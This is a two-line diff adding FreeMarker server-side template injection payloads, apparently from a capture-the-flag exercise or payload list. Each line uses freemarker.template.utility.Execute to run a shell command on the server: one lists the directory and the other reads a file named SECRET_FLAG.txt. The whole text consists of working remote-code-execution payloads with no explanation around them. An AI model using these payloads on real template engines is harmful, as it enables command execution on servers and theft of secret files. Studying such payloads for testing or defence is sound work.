@@ -1,0 +1,2 @@
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("ls ") }
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat SECRET_FLAG.txt ") }
